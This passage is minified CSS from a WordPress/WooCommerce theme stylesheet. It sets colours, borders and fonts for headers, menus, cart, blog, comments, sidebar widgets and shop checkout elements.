i{color:#288bd0;}header.nav_type_13{border-top:2px solid #ecf0f1;}.nav_type_13 nav ul,.nav_type_13 .header_current_cart{background:#ffffff;}.nav_type_13 ul li a,.nav_type_13 a#searchtop_img{color:#51585e;}.nav_type_13 nav ul li a:hover,.nav_type_13 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_13 .cart-content:hover,.nav_type_13 #searchtop_img:hover i{color:#288bd0;}header.nav_type_14{border-top:5px solid #ecf0f1;}.nav_type_14 nav ul,.nav_type_1 .header_current_cart{background:#ffffff;}.nav_type_14 ul li a,.nav_type_14 a#searchtop_img{color:#51585e;}.nav_type_14 nav ul li a:hover,.nav_type_14 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.nav_type_14 .cart-content:hover,.nav_type_14 #searchtop_img:hover i{color:#288bd0;}.header_bottom_nav.transparent_header.opaque_header{background:#ffffff !important;}header.nav_type_15,.header_bottom_nav.nav_type_15{border-top:1px solid #ecf0f1;}.header_bottom_nav.nav_type_15{background:#ffffff;}.nav_type_15 ul li a{color:#51585e; border-right:1px solid #ecf0f1}.nav_type_15 ul li:first-child a{border-left:1px solid #ecf0f1} .nav_type_15 nav ul li a:hover,.nav_type_15 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}header #header_socials a,.nav_type_15 a#searchtop_img{color:#51585e;}header #header_socials a:hover{color:#288bd0;}.header_bottom_nav.nav_type_15 .cart-content:hover,.header_bottom_nav.nav_type_15 #searchtop_img:hover i{color:#288bd0;}.header_bottom_nav.nav_type_16{border-top:1px solid #ecf0f1;}.header_bottom_nav.nav_type_16{background:#ffffff;}.nav_type_16 ul li a,.nav_type_16 a#searchtop_img{color:#51585e;}.nav_type_16 nav ul li a:hover,.nav_type_16 > ul > .current-menu-item > a{color:#288bd0; background:#f9f9fb;}.header_bottom_nav.nav_type_16 .cart-content:hover,.header_bottom_nav.nav_type_16 #searchtop_img:hover i{color:#288bd0;}.header_bottom_nav.nav_type_17{border-top:1px solid #ecf0f1;}.header_bottom_nav.nav_type_17{background:#ffffff;}.nav_type_17 ul li a,.nav_type_17 a#searchtop_img{color:#51585e;}.nav_type_17 nav ul li a:hover,.nav_type_17 > ul > .current-menu-item > a,.transparent_header.nav_type_17 nav > ul > .current-menu-item > a,.transparent_header.nav_type_17 nav > ul > li > a:hover{color:#288bd0; border-top:3px solid #288bd0 !important;}.header_bottom_nav.nav_type_17 .cart-content:hover,.header_bottom_nav.nav_type_17 #searchtop_img:hover i{color:#288bd0;}.header_bottom_nav.nav_type_18{border-top:1px solid #ecf0f1;}.header_bottom_nav.nav_type_18{background:#ffffff;}.nav_type_18 ul li a,.nav_type_18 a#searchtop_img{color:#51585e;}.nav_type_18 nav ul li a:hover,.nav_type_18 > ul >.current-menu-item > a{color:#288bd0; background#f9f9fb;}.header_bottom_nav.nav_type_18 .cart-content:hover,.header_bottom_nav.nav_type_18 #searchtop_img:hover i{color:#288bd0;}.nav_type_19 ul li a,.nav_type_19_f ul li a{color:#51585e;}.nav_type_19 ul > li > a,.nav_type_19_f ul > li > a{border-bottom:1px solid #ecf0f1;}.nav_type_19 ul ul li a,.nav_type_19_f ul ul li a{border-right:1px solid #ecf0f1;}#edge-search-form .search_button_icon{color:#51585e;}.nav_type_19 ul li a:hover,.nav_type_19 > ul > .current-menu-item > a,.nav_type_19_f ul li a:hover,.nav_type_19_f > ul > .current-menu-item > a{color:#288bd0;}.nav_type_19 .cart-content:hover,.nav_type_19 #searchtop_img:hover i,.nav_type_19_f .cart-content:hover,.nav_type_19_f #searchtop_img:hover i{color:#288bd0;}#fixed_header_socials a{color:#51585e;}#fixed_header_socials a{border:1px solid #ecf0f1;}.fixed_header_left{border-right:1px solid #ecf0f1;}#edge-search-form input[type=text]{border:1px solid #ecf0f1; background:#ffffff;}ul.header_current_cart li .cart-content{color:#51585e; font-weight: normal;}.transparent_header.opaque_header nav > ul > li > a, .transparent_header.opaque_header .cart-content{color:#51585e !important;}.transparent_header.opaque_header nav > ul > li > a:hover,.transparent_header nav > ul > .current-menu-item > a,.transparent_header.opaque_header nav > ul > .current-menu-item > a,.transparent_header nav > ul > li > a:hover{color:#288bd0 !important;}#header_container nav .rd_megamenu ul ul li a, .rd_megamenu ul ul li a,#header_container nav ul ul li a{font-family:Raleway !important; font-size:13px !important; font-weight:400 !important; line-height:14px !important; }ul.header_cart_dropdown,.header_cart_dropdown .button,#search-form,#search-form.pop_search_form #ssform,.child_pages_ctn li,#header_container nav ul li ul,#header_container nav ul li ul a{background:#ffffff;}#header_container nav .rd_megamenu ul li a, .rd_megamenu ul li a,.header_cart_dropdown ul.cart_list li a,.header_cart_dropdown .widget_shopping_cart_content .rd_cart_buttons a{color:#2c3e50;}.header_cart_dropdown, #header_container nav .rd_megamenu ul ul li a, .rd_megamenu ul ul li a,#header_container nav ul ul li a,.header_cart_dropdown .rd_clear_btn,.header_cart_dropdown .total,#search-form.pop_search_form #ssform,.child_pages_ctn a{color:#a1b1bc;}.header_cart_dropdown .quantity,.header_cart_dropdown .product_list_widget span.amount,.header_cart_dropdown .total .amount,.search_button_icon{color:#0f97f9;}.header_cart_dropdown ul.cart_list li a.remove:hover,.child_pages_ctn a:hover{background:#0f97f9; color:#ffffff;}.header_cart_dropdown ul.cart_list li a:hover{color:#0f97f9;}.header_cart_dropdown .rd_clear_btn:hover{color:#222533;}ul.header_cart_dropdown,#search-form.pop_search_form #ssform{border:1px solid #ecf0f1;}#header_container nav ul ul .current-menu-item li a, #header_container nav ul ul li a{border-left:1px solid #ecf0f1;}#header_container .fixed_header_left nav ul ul ul li a{border-left:1px solid #ecf0f1 !important;}#header_container .fixed_header_left nav ul ul .current-menu-item li a, #header_container .fixed_header_left nav ul ul li a{border-right:1px solid #ecf0f1 !important;}#header_container .fixed_header_left nav ul ul, #header_container .fixed_header_left nav ul ul{border-top:1px solid #ecf0f1 !important;}#header_container nav ul ul li,ul.header_cart_dropdown ul.product_list_widget li.child_pages_ctn a{border-bottom:1px solid #ecf0f1;}#header_container .rd_megamenu ul li ul,.header_cart_dropdown .clear_total{border-top:1px solid #ecf0f1;}#header_container nav ul ul,.widget_shopping_cart_content,#search-form{border-top:3px solid #0f97f9;}.current_item_number{background:#0f97f9;}.rd_cart_buttons{background:#222533;}.header_cart_dropdown .button{background:#ffffff; border:2px solid #ffffff  !important;}.header_cart_dropdown .widget_shopping_cart_content .rd_cart_buttons .button:hover{background:#222533; border:2px solid #ffffff !important; color:#ffffff;}.current_item_number:before{border-color: transparent #0f97f9 transparent;}.header_cart_dropdown ul.cart_list li a.remove{background:#a1b1bc;}#header_container nav ul ul li a:hover,#header_container nav ul ul li.current-menu-item > a{background:#ecf0f1; color:#2c3e50;}#header_container nav ul ul .mm_widget_area{border:none!important; border-left:1px solid #ecf0f1 !important;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .product_list_widget a{color:#2c3e50;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .product_list_widget a:hover{color:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .sb_widget h3{color:#2c3e50}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #lang_sel a{color:#a1b1bc; background:#ffffff; border:1px solid #ecf0f1}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #lang_sel a:hover{color:#2c3e50;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_recent_entries ul li{border-bottom:1px solid #ecf0f1}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_recent_entries ul li a{color:#a1b1bc}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_recent_entries ul li a:hover{color:#0f97f9}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #recentcomments li{border-bottom:1px solid #ecf0f1}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #recentcomments li a{color:#2c3e50;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #recentcomments li a:hover{color:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .rd_widget_recent_entries li{border-bottom:1px solid #ecf0f1}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .w_comment a{color:#a1b1bc;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .w_comment a:hover{color:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_recent_entry h4 a{color:#2c3e50;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_recent_entry h4 a:hover{color:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_archive ul li,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_meta ul li{border-bottom:1px solid #ecf0f1}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_archive ul li a,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_meta ul li a{color:#a1b1bc;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_archive ul li a:hover,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .widget_meta ul li a:hover{color:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .page_item a, #header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .menu-item a{border-bottom:1px solid #ecf0f1; color:#a1b1bc;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .page_item a:hover, #header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .menu-item a:hover,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .current_page_item a,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .current_page_item a{color:#0f97f9; }#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .page_item a:before, #header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area .menu-item a:before { color:#222533;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar caption{background:#2c3e50; color:#ffffff}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar{border:1px solid #ecf0f1}#wp-calendar th{color:#222533;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar tbody td a{color:#fff; background:#222533;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar tbody td a:hover{color:#fff; background:#0f97f9;}#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar td#next a:hover:after,#header_container nav .rd_megamenu .mm_widget_area .rd_megamenu_widget_area #wp-calendar td#prev a:hover:after{background:#0f97f9;}body{font-family:Raleway; font-size:16px; font-weight:400; line-height:24px; }p{  line-height:24px; }h1{font-family:Raleway; font-size:34px; font-weight:400; line-height:42px; }h2{font-family:Raleway; font-size:24px; font-weight:700; line-height:36px; }h3{font-family:Raleway; font-size:20px; font-weight:700; line-height:24px; }h4{font-family:Raleway; font-size:18px; font-weight:700; line-height:24px; }h5{font-family:Raleway; font-size:16px; font-weight:400; line-height:24px; }h6{font-family:Raleway; font-size:14px; font-weight:300; line-height:24px; }body,#jprePercentage{color:#51585e}body a,.hl_color,#sidebar #search input[type=submit]:hover,.wpb_widgetised_column #search input[type=submit]:hover,.strong_colored strong{color:#0f97f9}body a:hover{color:#2396e6}h1,h2,h3,h4,h5,h6{color:#2c3e50}.partners_left, .partners_right{background:#2c3e50}.def_section,blockquote{background:#ffffff}#to_top:hover,.b-read-now:hover{background:#288bd0}::-webkit-input-placeholder{color:#a1b1bc}:-moz-placeholder{color:#a1b1bc}::-moz-placeholder{color:#a1b1bc}:-ms-input-placeholder{color:#a1b1bc}#sidebar #search input[type=submit],.wpb_widgetised_column #search input[type=submit]{color:#a1b1bc}input[type=text], input[type=email], input[type=password], textarea,#coupon_code{color:#a1b1bc; border:1px solid #eceef0; background:#ffffff;}input[type="checkbox"]{color:#ffffff; border:1px solid #eceef0; background:#ffffff;}input[type=checkbox]:checked{color:#ffffff; border:1px solid #2396e6; background:#2396e6;}.flex-direction-nav li a{color:#2c3e50; background:#ffffff;}.wpb_text_column ol li:before{background:#51585e}.wpb_text_column ol li:hover:before{background:#0f97f9}blockquote{ border:1px solid #ecf0f1; }blockquote:before,.post-password-form input[type=submit]{ background:#288bd0; }.code_box_ctn{ background:#f9fafb; }.wp-caption{ background:#f9fafb; border:1px solid #ecf0f1; }.tp-caption a {color: #fff;}.tp-caption a:hover { color: #fff;}.tp-bannertimer{background: #2396e6; background: -moz-linear-gradient(left,  #2396e6 0%, #2396e6 100%); background: -webkit-gradient(linear, left top, right top, color-stop(0%,#2396e6), color-stop(100%,#2396e6)); background: -webkit-linear-gradient(left,  #2396e6 0%,#2396e6 100%); background: -o-linear-gradient(left,  #2396e6 0%,#2396e6 100%); background: -ms-linear-gradient(left,  #2396e6 0%,#2396e6 100%); background: linear-gradient(to right,  #2396e6 0%,#2396e6 100%); filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#2396e6", endColorstr="#2396e6",GradientType=1 );} .page_title_ctn{border-bottom:1px solid #ecf0f1;  }.page_title_ctn h1{color:#ffffff; }#crumbs a,#crumbs span{color:#a1b1bc; }.rd_child_pages{color:#a1b1bc; border:1px solid #a1b1bc; background:#ffffff;}.search_results strong{color:#0f97f9; }.search_sf .rd_search_sc #search input[type=submit]{background:#2c3e50 !important;}.search_sf .rd_search_sc #search input[type=submit]:hover{background:#2396e6 !important;}.post_single .post-title h2 a,.blog_related_post .post-title h2 a,.logged-in-as a{color:#2c3e50}.post_single .post-title h2 a:hover,.blog_related_post .post-title h2 a:hover{color:#2396e6}.mejs-container .mejs-controls,.audio_ctn{background:#51585e !important;}.mejs-controls .mejs-time-rail .mejs-time-current{background:#2c3e50 !important; }.mejs-controls .mejs-horizontal-volume-slider .mejs-horizontal-volume-current{background:#2396e6 !important; }.post_quote_text,.post_quote_author,.post_single_business .post_quote_text:after{background:#288bd0; color:#ffffff!important;}.post-info a{color:#51585e}.post_single .post-info a:hover{color:#2396e6}.single_post_navigation,.post-info{border-bottom:1px solid #ecf0f1}.single_post_navigation_bottom{border-top:1px solid #ecf0f1}.tags_icon{background:#2c3e50; color:#ffffff;}.single_post_tags{border:1px solid #eceef0; background:#ffffff;}.shareicons_icon{background:#288bd0; color:#ffffff;}.single_post_share_icon{border:1px solid #eceef0; background:#ffffff;}.single_post_share_icon .share-box li a{color:#a1b1bc;}.single_post_share_icon .share-box li a:hover{color:#288bd0 !important;}#author-bio{border:1px solid #eceef0; background:#f9fafb; color:#a1b1bc; box-shadow:0 0px 0px #ffffff, 0 4px 0 -1px #ffffff, 0 0px 0px 0px #ffffff,0 0px 0px #ffffff, 0 4px 0 0px #ecf0f1, 0px 0px 0px 0px #ffffff;}#author-info h3{color:#2c3e50;}.author_posts_link{color:#a1b1bc;}.author_posts_link:hover{color:#288bd0;}.comment_ctn{border:1px solid #eceef0; background:#ffffff; color:#a1b1bc; box-shadow:0 0px 0px #ffffff, 0 4px 0 -1px #ffffff, 0 0px 0px 0px #ffffff,0 0px 0px #ffffff, 0 4px 0 0px #ecf0f1, 0px 0px 0px 0px #ffffff;}#business_comments #comments ul li .details span.Reply a{border:1px solid #eceef0; background:#ffffff; color:#a1b1bc;}.comment_count h3 a{color:#2c3e50}#comments ul li .details span.author a,#comments ul li .details span.author{color:#2c3e50}#comments ul li .details span.date a{color:#a1b1bc}#comments ul li .details span.Reply a{background:#a1b1bc; color:#ffffff}#comments ul li .details span.Reply a:hover{background:#222533; color:#ffffff}#business_comments #comments ul li .comment_ctn{border-bottom:1px solid #ecf0f1;}#comments > ul > li ul{border-left:1px solid #ecf0f1}#comments ul li li .comment_ctn:before{background:#ecf0f1;}input.single_post_author,input.single_post_email,input.single_post_url,.single_post_comment{background:#f9fafb}input.single_post_author:focus,input.single_post_email:focus,input.single_post_url:focus,.single_post_comment:focus{background:#ffffff}#add-comment input#submit{background:#2c3e50; color:#ffffff}#add-comment input#submit:hover{background:#2396e6; color:#ffffff}#business_comments #add-comment input#submit,#respond input#submit{background:#0f97f9; color:#ffffff}#business_comments #add-comment input#submit:hover,,#respond input#submit:hover{background:#2396e6; color:#ffffff}#business_comments #comments ul li .details span.Reply a:hover{background:#0f97f9 !important; color:#ffffff; border-color:#0f97f9;}.blog_related_post .more-link{border:1px solid #2c3e50; color:#2c3e50; background:#ffffff;}.blog_related_post .more-link:hover{color:#ffffff; background:#2c3e50;}.cbp_type03 .rp_left,.cbp_type03 .rp_right{background:#2c3e50}.cbp_type03 .rp_left:hover,.cbp_type03 .rp_right:hover{background:#2396e6}.cbp_type03 .blog_related_post .more-link:hover{background:#2396e6; border-color:#2396e6;}.cbp_type05 .rp_left,.cbp_type05 .rp_right,.cbp_type08 .rp_left,.cbp_type08 .rp_right{background:#0f97f9}.cbp_type05 .rp_left:hover,.cbp_type05 .rp_right:hover,.cbp_type08 .rp_left:hover,.cbp_type08 .rp_right:hover{background:#222533}.cbp_type05 .carousel_recent_post .blog_box_content,.cbp_type08 .carousel_recent_post .blog_box_content{color:#51585e}.cbp_type05 .carousel_recent_post h5.widget_post_title a,.cbp_type08 .carousel_recent_post h5.widget_post_title a{color:#2c3e50}.cbp_type05 .carousel_recent_post:hover .blog_box_content,.cbp_type05 .blog_post_link_ctn,.cbp_type08 .carousel_recent_post:hover .blog_box_content,.cbp_type08 .blog_post_link_ctn{background:#2c3e50; color:#a1b1bc;}.cbp_type05 .carousel_recent_post:hover h5.widget_post_title a,.cbp_type08 .carousel_recent_post:hover h5.widget_post_title a{color:#ffffff}.cbp_type06 .rp_left,.cbp_type06 .rp_right{background:#51585e}.cbp_type06 .rp_left:hover,.cbp_type06 .rp_right:hover{background:#2c3e50}.cbp_type06 .carousel_recent_post .blog_box_content{color:#51585e}.cbp_type06 .carousel_recent_post h5.widget_post_title a{color:#2c3e50}.cbp_type06 a.more-link{background:#51585e; color:#fff;}.cbp_type06 a.more-link:after{background:#2c3e50; color:#fff;}.cbp_type06 a.more-link:hover{background:#0f97f9; color:#fff;}.cbp_type06 a.more-link:hover:after{
+background: rgba(0, 0, 0, 0.21); color:#fff;}.sp_left:hover,.sp_right:hover{background:#0f97f9; border-color:#0f97f9;}.sb_widget h3{color:#2c3e50}.sb_widget > h3:before{border-top:7px solid #0f97f9; border-bottom:7px solid #2396e6;}#sidebar #lang_sel a,.wpb_widgetised_column #lang_sel a{color:#51585e; background:#ffffff; border:1px solid #ecf0f1}#sidebar #lang_sel a:hover,.wpb_widgetised_column #lang_sel a:hover{color:#2c3e50;}#sidebar .widget_recent_entries ul li,.wpb_widgetised_column .widget_recent_entries ul li{border-bottom:1px solid #ecf0f1}#sidebar .widget_recent_entries ul li a,.wpb_widgetised_column .widget_recent_entries ul li a{color:#51585e}#sidebar .widget_recent_entries ul li a:hover,.wpb_widgetised_column .widget_recent_entries ul li a:hover{color:#0f97f9}#sidebar #recentcomments li,.wpb_widgetised_column #recentcomments li{border-bottom:1px solid #ecf0f1}#sidebar #recentcomments li a,.wpb_widgetised_column #recentcomments li a,#sidebar .tweets li a,.wpb_widgetised_column .tweets li a{color:#2c3e50;}#sidebar #recentcomments li a:hover,.wpb_widgetised_column  #recentcomments li a:hover{color:#2396e6;}#sidebar .rd_widget_recent_entries li,.wpb_widgetised_column .rd_widget_recent_entries li,#sidebar  .tweets li,.wpb_widgetised_column .tweets li{border-bottom:1px solid #ecf0f1}#sidebar .tagcloud a ,.wpb_widgetised_column .tagcloud a {border:1px solid #ecf0f1; color:#51585e}#sidebar .tagcloud a:hover,.wpb_widgetised_column .tagcloud a:hover{background:#288bd0; border-color:#288bd0; color:#ffffff;}#sidebar .w_comment a,.wpb_widgetised_column .w_comment a{color:#51585e;}#sidebar .w_comment a:hover,.wpb_widgetised_column .w_comment a:hover{color:#0f97f9;}#sidebar .widget_recent_entry h4 a,.wpb_widgetised_column .widget_recent_entry h4 a{color:#2c3e50;}#sidebar .widget_recent_entry h4 a:hover,.wpb_widgetised_column .widget_recent_entry h4 a:hover{color:#0f97f9;}#sidebar .widget_archive ul li,#sidebar .widget_meta ul li,.wpb_widgetised_column .widget_archive ul li,.wpb_widgetised_column .widget_meta ul li{border-bottom:1px solid #ecf0f1}#sidebar .widget_archive ul li a,#sidebar .widget_meta ul li a,.wpb_widgetised_column  .widget_archive ul li a,.wpb_widgetised_column .widget_meta ul li a{color:#51585e;}#sidebar .widget_archive ul li a:hover,#sidebar .widget_meta ul li a:hover,.wpb_widgetised_column .widget_archive ul li a:hover,.wpb_widgetised_column .widget_meta ul li a:hover{color:#0f97f9;}#sidebar .page_item a, #sidebar .menu-item a,.wpb_widgetised_column .page_item a,.wpb_widgetised_column .menu-item a{border-bottom:1px solid #ecf0f1; color:#51585e;}#sidebar .page_item a:hover, #sidebar .menu-item a:hover,#sidebar .current_page_item a,#sidebar .current_page_item a,.wpb_widgetised_column .page_item a:hover,.wpb_widgetised_column .menu-item a:hover,.wpb_widgetised_column .current_page_item a{color:#0f97f9; }#sidebar .page_item a:before, #sidebar .menu-item a:before,.wpb_widgetised_column .page_item a:before,.wpb_widgetised_column .menu-item a:before{ color:#288bd0;}#wp-calendar caption{background:#2c3e50; color:#ffffff}#wp-calendar{border:1px solid #ecf0f1}#wp-calendar th{color:#288bd0;}#wp-calendar tbody td a{color:#fff; background:#288bd0;}#wp-calendar tbody td a:hover{color:#fff; background:#0f97f9;}#wp-calendar td#next a:hover:after,#wp-calendar td#prev a:hover:after{background:#0f97f9;}.rd_widget_recent_entries .thumbnail a:before,.port_tn a:before,.rd_widget_recent_entries_f .thumbnail a:before{background:#288bd0;}.single_port_navigation,.port_details_full_information .item_details_info{border-bottom:1px solid #ecf0f1;}.all_projects_btn{color:#51585e;}.next_project{border:1px solid #ecf0f1; background:#ecf0f1; color:#2c3e50;}.next_project:hover{border:1px solid #222533; background:#222533; color:#fff;}.previous_project{border:1px solid #51585e; background:#ffffff; color:#51585e;}.previous_project:hover{border:1px solid #2396e6; background:#2396e6; color:#fff;}.port_details_subtitle{color:#0f97f9;}.port_meta{border-bottom:1px solid #ecf0f1;}.next_project{border-bottom:1px solid #ecf0f1;}.port_vp a{background:#2c3e50;}.port_vp a:hover{background:#2396e6; color:#fff;}.single_staff_meta{border-top:1px solid #ecf0f1;}#member_email a:hover, .sc-share-box #member_email a, .single_staff_social #member_email a,.share_icons_business .share-box #member_email a{background:#0f97f9;}.product_filtering {border-bottom:1px solid #ecf0f1}.filter_param,.filter_param li ul{background:#ffffff; border:1px solid #eceef0; color:#a1b1bc;}.filter_param strong{color:#2c3e50;}.current_li:after{border-left:1px solid #eceef0;}.filter_param.filter_param_sort{background:#a1b1bc; border:1px solid #a1b1bc;}.filter_param.filter_param_sort a{color:#ffffff}.filter_param.filter_param_order a,.filter_param.filter_param_count a{color:#a1b1bc}.filter_param.filter_param_order a:hover,.filter_param.filter_param_count a:hover{color:#222533}.shop_two_col,.shop_three_col,.shop_four_col,.caroufredsel_wrapper .inner_product,.woocommerce .products li{color:#a1b1bc; background:#ffffff; border:1px solid #eceef0;}.custom_cart_button a{color:#a1b1bc;}.custom_cart_button a:hover{color:#222533;}.product_box {border-top:1px solid #eceef0; border-bottom:1px solid #eceef0;}.product_box h3{color:#2c3e50;}.product_box h3:hover{color:#288bd0;}.product_box .price{color:#a1b1bc;}.product_box .price del{color:#a1b1bc !important;}.product_box .price ins{color:#288bd0;}.adding_to_cart_working .icon_status_inner:before{color:#0f97f9;}.adding_to_cart_completed .icon_status_inner:before{color:#2396e6;}.single_product_main_image div,.single_products_thumbnails img,.single_product_navigation .previous_product,.single_product_navigation .next_product {border:1px solid #ecf0f1 }.single_product_navigation .previous_product:hover,.single_product_navigation .next_product:hover{border:1px solid #222533; background:#222533; color:#ffffff }.single_products_thumbnails img.selected{border:1px solid #0f97f9 }.product_nav_left:hover,.product_nav_right:hover{background:#0f97f9 }.product_title.entry-title,.woocommerce-tabs ul li a,.related h2,.single_product_navigation .previous_product,.single_product_navigation .next_product,.woocommerce-page #reviews #comments ol.commentlist li .comment-text p.meta strong, .woocommerce-page #reviews #comments h2,.show_review_form.button {color:#2c3e50 }.summary.entry-summary .price,.summary.entry-summary .price del,.show_review_form.button,.woocommerce-page #reviews #comments ol.commentlist li .comment-text p.meta{color:#51585e }.summary.entry-summary .price ins,.woocommerce-product-rating .woocommerce-review-link,.custom_cart_button .button.add_to_cart_button.product_type_simple.added{color:#0f97f9 }.woocommerce-product-rating .woocommerce-review-link:hover{color:#2396e6 }button.single_add_to_cart_button.button.alt{color:#2c3e50; background:#ffffff; border:2px solid #2c3e50; }button.single_add_to_cart_button.button.alt:hover{color:#ffffff; background:#2396e6; border:2px solid #2396e6; }.single_product_navigation{border-top:1px solid #ecf0f1 }.related_left, .related_right,.upsells_left, .upsells_right{border:1px solid #eceef0; color:#a1b1bc ; background:#ffffff;}.related_left:hover, .related_right:hover,.upsells_left:hover, .upsells_right:hover{border:1px solid #2396e6; color:#ffffff ; background:#2396e6;}.woo-share-box ul li a,.woo_img_next,.woo_img_prev{background:#ecf0f1; color:#51585e ;}.woo_img_next:hover,.woo_img_prev:hover{background:#222533; color:#ffffff ;}.woocommerce-tabs .tabs li a{border-right:1px solid #ecf0f1 }.woocommerce-tabs,.woocommerce-tabs li.active{border-left:1px solid #ecf0f1 }.woocommerce-tabs li.active{border-bottom:1px solid #ffffff }.woocommerce-tabs .tabs li a{border-top:1px solid #ecf0f1 }.woocommerce-tabs .panel{border:1px solid #ecf0f1 }.woocommerce-page #reviews #comments h2,#reviews #comments ol.commentlist li{border-bottom:1px solid #ecf0f1 !important; }.chosen-container-single .chosen-single,#rd_login_form .inline,.product-description a,.shipping td:last-child{color:#51585e}.chosen-container-single .chosen-single,.select2-drop{background:#ffffff}.woocommerce-cart .cart_totals h2, .woocommerce-cart form h2, .woocommerce-checkout .woocommerce h2,.woocommerce form .form-row label, .woocommerce-page form .form-row label,.checkout_steps .active_step,.product-qty,.rd_order_total,.country_to_state,.cross-sells h2,.woocommerce-cart .cart_totals,.shop_table.order_details tfoot,.woocommerce .order_details li strong, .woocommerce-page .order_details li strong{color:#2c3e50}.woocommerce-cart .cart_totals strong, .rd_order_total .total strong,.shop_table.order_details tfoot .amount,.order_complete_ctn h3,.customer_details dd{color:#0f97f9;}.woocommerce-checkout input[type=text],.woocommerce-checkout input[type=email],.woocommerce-checkout input[type=password],.woocommerce-checkout textarea,.form-row .chosen-container-single .chosen-single,.woocommerce-checkout .product-name img,.order_and_total_wrapper,.user_current_cart,.woocommerce-page table.cart img,.woocommerce-message, .woocommerce-error, .woocommerce-info,.country_to_state,.shop_table.order_details,.woocommerce .order_details, .woocommerce-page .order_details,#calc_shipping_state,.woocommerce-cart #coupon_code,.woocommerce form .form-row input.input-text,.country_to_state .select2-choice,.state_select .select2-choice,#calc_shipping_state .select2-choice,.select2-drop-active,#braintree-cc-exp-month, #braintree-cc-exp-year{border:1px solid #ecf0f1; color: #51585e;}.woocommerce-page input[type=submit],.woocommerce-page button[type=submit],.customer_details_next,.rd_create_acc,#place_order,.rd_coupon_form .alt2,.coupon input.button.alt2,#review_form  input[type=submit],.woocommerce .addresses .title .edit, .woocommerce-page .addresses .title .edit {background:#0f97f9; color:#ffffff;}.cart_details_back,.customer_details_back,#rd_login_form input[type=submit],#rd_login_form button[type=submit],.rd_guest_acc,.update_cart input.checkout-button.button,.cart-collaterals .shipping_calculator .button,.create_acc_done,.wc-backward{background:#51585e; color:#ffffff;}.shop_table thead{background:#ecf0f1; color:#2c3e50;}ul.payment_methods.methods li{border-bottom:1px solid #ecf0f1;}.woocommerce-page .order_details li{border-right:1px solid #ecf0f1;}.cart_totals tr td,.cart_totals tr th{border:1px solid #ecf0f1 !important;}.cart_totals tr td{border-left:none!important;}.cart_totals tr:first-child td,.cart_totals tr:first-child th{border-bottom:none!important;}.cart_totals tr:last-child td,.cart_totals tr:last-child th{border-top:none!important;}.show_review_form.button:hover{color:#222533;}.woocommerce-page input[type=submit]:hover,.woocommerce-page button[type=submit]:hover,.customer_details_next:hover,.rd_create_acc:hover,#place_order:hover,.rd_coupon_form .alt2:hover,.coupon input.button.alt2:hover,#review_form input[type=submit]:hover,.woocommerce .addresses .title .edit:hover, .woocommerce-page .addresses .title .edit:hover{background:#2396e6; color:#ffffff;}.cart_details_back:hover,.customer_details_back:hover,.rd_guest_acc:hover,#rd_login_form input[type=submit]:hover,#rd_login_form button[type=submit]:hover,.update_cart input.checkout-button.button:hover,.cart-collaterals .shipping_calculator .button:hover,.wc-backward:hover{background:#222533; color:#ffffff;}.my_account_orders{border:1px solid #ecf0f1;}nav.woocommerce-MyAccount-navigation ul li a{color:#51585e}a.woocommerce-MyAccount-downloads-file.button.alt { background#0f97f9;}#sidebar #searchform div #s,.wpb_widgetised_column #searchform div #s{background:#ffffff !important; border:1px solid #eceef0; color:#a1b1bc}#s::-webkit-input-placeholder{color:#a1b1bc}#s:-moz-placeholder{color:#a1b1bc}#s::-moz-placeholder{color:#a1b1bc}#s:-ms-input-placeholder{color:#a1b1bc}.widget_product_search input[type=submit]{background:none!important; color:#a1b1bc}.widget_product_search input[type=submit]:hover{background:none!important; color:#2396e6}.ui-slider-handle.ui-state-default.ui-corner-all{background:#0f97f9}.ui-slider-range.ui-widget-header.ui-corner-all{background:#ecf0f1}.price_slider.ui-slider.ui-slider-horizontal.ui-widget.ui-widget-content.ui-corner-all{border:1px solid #ecf0f1}.price_slider_amount 